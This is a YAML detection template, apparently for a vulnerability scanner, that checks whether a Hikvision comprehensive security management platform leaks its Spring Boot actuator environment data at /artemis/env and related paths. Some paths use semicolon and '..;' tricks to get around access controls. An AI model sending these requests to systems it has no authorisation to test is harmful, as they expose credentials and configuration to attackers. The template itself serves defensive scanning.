id: hikvision-env
name: Hikvision Springboot Env Actuator - Detect
severity: high
confidence: confirmed
description: The HIKVISION comprehensive security management platform has information leakage vulnerabilities, through which
  attackers can obtain sensitive information such as environment env for further attacks
reference: https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/HIKVISION/HiKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20env%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
tags:
- misconfig
- hikvision
- springboot
- env
- vuln
requests:
- method: GET
  path: /artemis/env
  matchers: &id001
  - type: body
    words:
    - applicationConfig
    - activeProfiles
  - type: body
    words:
    - server.port
    - local.server.port
  - type: header
    words:
    - application/json
    - application/vnd.spring-boot.actuator
    - application/vnd.spring-boot.actuator.v1+json
    - application/vnd.spring-boot.actuator.v2+json
    - application/vnd.spring-boot.actuator.v3+json
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /artemis-portal/artemis/env
  matchers: *id001
  condition: and
- method: GET
  path: /artemis/actuator/env
  matchers: *id001
  condition: and
- method: GET
  path: /artemis;/env;
  matchers: *id001
  condition: and
- method: GET
  path: /artemis/1/..;/env
  matchers: *id001
  condition: and
